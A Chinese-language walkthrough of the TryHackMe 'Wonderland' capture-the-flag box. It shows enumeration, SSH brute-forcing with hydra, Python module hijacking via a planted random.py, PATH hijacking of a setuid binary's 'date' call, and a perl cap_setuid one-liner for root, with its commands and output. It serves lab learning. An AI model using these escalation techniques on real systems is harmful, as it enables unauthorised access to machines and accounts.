#服务发现
```
┌──(root💀kali)-[~]
└─# nmap -sV -Pn 10.10.86.51
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 02:41 EDT
Nmap scan report for 10.10.132.163
Host is up (0.33s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.63 seconds
```


#目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -u "http://10.10.132.163" -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt  -t 100

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-16_02-08-56.log

Target: http://10.10.132.163

[02:08:56] Starting: 
[02:08:59] 301 -    0B  - /img  ->  img/
[02:09:00] 200 -  402B  - /           
[02:09:00] 301 -    0B  - /r  ->  r/        
[02:10:24] 301 -    0B  - /poem  ->  poem/            
[02:10:34] 301 -    0B  - /http%3A%2F%2Fwww  ->  /http:/www
[02:12:54] 301 -    0B  - /http%3A%2F%2Fyoutube  ->  /http:/youtube               
[02:13:49] 301 -    0B  - /http%3A%2F%2Fblogs  ->  /http:/blogs                                                     
[02:13:57] 301 -    0B  - /http%3A%2F%2Fblog  ->  /http:/blog
[02:14:39] 301 -    0B  - /%2A%2Ahttp%3A%2F%2Fwww  ->  /%2A%2Ahttp:/www              
[02:21:21] 301 -    0B  - /http%3A%2F%2Fcommunity  ->  /http:/community                                                                                                                         
[02:21:58] 301 -    0B  - /http%3A%2F%2Fradar  ->  /http:/radar                                           
[02:23:23] 301 -    0B  - /http%3A%2F%2Fjeremiahgrossman  ->  /http:/jeremiahgrossman                                                      
[02:23:23] 301 -    0B  - /http%3A%2F%2Fweblog  ->  /http:/weblog
[02:23:27] 301 -    0B  - /http%3A%2F%2Fswik  ->  /http:/swik
```


#http://10.10.132.163/r是一行文字
```
Keep Going.

"Would you tell me, please, which way I ought to go from here?"
```

#http://10.10.132.163/poem 是一首英文诗
```
The Jabberwocky

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

“Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!”

He took his vorpal sword in hand:
Long time the manxome foe he sought —
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

“And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!”
He chortled in his joy.

‘Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
```


#给出来的hint是：Everything is upside down here. 发现img/下有三张图片，alice_door有一行英文，无论倒过来还是正面看都看不出来写的是什么
```
alice_door.jpg
alice_door.png
white_rabbit_1.jpg
```

#谷歌搜索可能是插画作者的落款，插画作者名字叫John Tenniel   


#尝试以alice为用户名爆破ssh，连接被reset了，看来不让爆ssh
hydra -l alice -P /usr/share/wordlists/rockyou.txt 10.10.86.51ssh  -v 

#爆破目录r/,得到http://10.10.132.163/r/a
```
Keep Going.

"That depends a good deal on where you want to get to," said the Cat.
```

#重复爆破,得到http://10.10.132.163/r/a/b
```
Keep Going.

"I don’t much care where—" said Alice.
```

#http://10.10.132.163/r/a/b/b
```
Keep Going.

"Then it doesn’t matter which way you go," said the Cat.
```

#http://10.10.132.163/r/a/b/b/i/
```
Keep Going.

"—so long as I get somewhere,"" Alice added as an explanation.
```

#http://10.10.132.163/r/a/b/b/i/t/
```
Open the door and enter wonderland

"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
```

#在上面页面查看网页源代码发现一个类似登录凭证的东西
```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```


#成功登录alice的ssh账号
```
┌──(root💀kali)-[~]
└─# ssh alice@10.10.86.51                                                                                                                                                                                                           130 ⨯
alice@10.10.132.163's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Sep 16 08:30:29 UTC 2021

  System load:  0.0                Processes:           84
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 15%                IP address for eth0: 10.10.132.163
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ pwd
/home/alice
alice@wonderland:~$ ls
root.txt  walrus_and_the_carpenter.py
alice@wonderland:~$ ls -alh
total 40K
drwxr-xr-x 5 alice alice 4.0K May 25  2020 .
drwxr-xr-x 6 root  root  4.0K May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3.7K May 25  2020 .bashrc
drwx------ 2 alice alice 4.0K May 25  2020 .cache
drwx------ 3 alice alice 4.0K May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4.0K May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3.5K May 25  2020 walrus_and_the_carpenter.py
alice@wonderland:~$ 
```

#发现有root flag，但是当然没有读权限，同目录还有一个python脚本


#全局查找user.txt失败

#查看home目录和/etc/passwd文件，除了alice以外，还有hatter  rabbit  tryhackme三个用户，但是alice用户都没有进入这三个用户主目录的权限，看来是需要横向提权？

#查找所有包含hatter  rabbit  tryhackme字样的文件，没啥发现
```
find / |xargs grep -ri 'hatter' -l >hatter.txt 
find / |xargs grep -ri 'rabbit' -l >rabbit.txt  
find / |xargs grep -ri 'tryhackme' -l >tryhackme.txt
```

#上传linpease，枚举提权漏洞，发现可以利用perl提升到root权限
```
Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

#但是alice本身没有执行/usr/bin/perl的权限，而用户hatter可以，也就是我们需要先提权到hatter
```
alice@wonderland:/etc/ldap$ ll /usr/bin/perl
-rwxr-xr-- 2 root hatter 2097720 Nov 19  2018 /usr/bin/perl*
```

#user flag的提示是Everything is upside down here.因为root.txt在/home/alice/root.txt，所以user.txt就是在/root/user.txt ，，这其实是一道理解题。。。
```
alice@wonderland:~$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
```

#用alice身份 sudo -l，发现walrus_and_the_carpenter.py跟rabbit是关联的
```
alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```


#walrus_and_the_carpenter.py源代码如下
```
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head —
There were no birds to fly.

The Walrus and the Carpenter
Were walking close at hand;
They wept like anything to see
Such quantities of sand:
"If this were only cleared away,"
They said, "it would be grand!"

"If seven maids with seven mops
Swept it for half a year,
Do you suppose," the Walrus said,
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.

"O Oysters, come and walk with us!"
The Walrus did beseech.
"A pleasant walk, a pleasant talk,
Along the briny beach:
We cannot do with more than four,
To give a hand to each."

The eldest Oyster looked at him.
But never a word he said:
The eldest Oyster winked his eye,
And shook his heavy head —
Meaning to say he did not choose
To leave the oyster-bed.

But four young oysters hurried up,
All eager for the treat:
Their coats were brushed, their faces washed,
Their shoes were clean and neat —
And this was odd, because, you know,
They hadn’t any feet.

Four other Oysters followed them,
And yet another four;
And thick and fast they came at last,
And more, and more, and more —
All hopping through the frothy waves,
And scrambling to the shore.

The Walrus and the Carpenter
Walked on a mile or so,
And then they rested on a rock
Conveniently low:
And all the little Oysters stood
And waited in a row.

"The time has come," the Walrus said,
"To talk of many things:
Of shoes — and ships — and sealing-wax —
Of cabbages — and kings —
And why the sea is boiling hot —
And whether pigs have wings."

"But wait a bit," the Oysters cried,
"Before we have our chat;
For some of us are out of breath,
And all of us are fat!"
"No hurry!" said the Carpenter.
They thanked him much for that.

"A loaf of bread," the Walrus said,
"Is what we chiefly need:
Pepper and vinegar besides
Are very good indeed —
Now if you’re ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf —
I’ve had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we’ve brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter’s spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

#分析源代码,看上去只是随机输出10行诗句，但是假如我们在同目录创建一个random.py,并且py的代码如下，那么我们执行时就可以拿到rabbit的shell。这实际上是利用了python的包含文件原理，如果同目录有同名文件，则优先包含同目录的，其次才去找库文件有没有同名文件
```
#random.py
import os
os.system("/bin/bash")
```

#执行
```
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ whoami
rabbit
```

#现在我们拿到了rabbit的shell，在/home/rabbit目录，发现一个二进制文件teaParty，执行提示
```
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Fri, 17 Sep 2021 07:42:14 +0000
Ask very nicely, and I will give you some tea while you wait for him
hello?
Segmentation fault (core dumped)

```

#我们把teaParty这个二进制文件传回kali攻击机，用strings命令查看（strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束）
```
┌──(root💀kali)-[~/tryhackme/wonderland]
└─# strings teaParty
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0

```

#分析下面这行代码
```/bin/echo -n 'Probably by ' && date --date='next hour' -R```
首先执行/bin/echo -n 'Probably by '，然后再执行date --date='next hour' -R，date这个命令没有指明路径，像上面的python文件一样，如果当前目录有这个文件，那就会执行这个文件，没有这个文件系统就会去$PATH查找是否有这个命令


#查看当前$PATH
```
rabbit@wonderland:/home/rabbit$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```

#把tmp目录加进$PATH里
```
rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

```

#在/tmp下创建一个date文件，编写以下代码，并且chmod +x /tmp/date
```
#!/bin/bash
/bin/bash
```

#再次执行，获得hatter的shell
```
rabbit@wonderland:/home/rabbit$ vim /tmp/date
rabbit@wonderland:/home/rabbit$ chmod +x /tmp/date 
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ whoami
hatter
hatter@wonderland:/home/rabbit$ id
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

#在hatter目录拿到ssh密码
```
hatter@wonderland:/home/rabbit$ cat /home/hatter/password.txt
WhyIsARavenLikeAWritingDesk?

```

#用ssh登录hatter账号拿到hatter的full shell，根据之前linpease枚举的结果利用perl提升到root权限（参考https://gtfobins.github.io/gtfobins/perl/）
```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
uid=0(root) gid=1003(hatter) groups=1003(hatter)
# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

#总结
非常精彩的靶机，走了不少弯路，学习了通过引用文件进行提权的方法。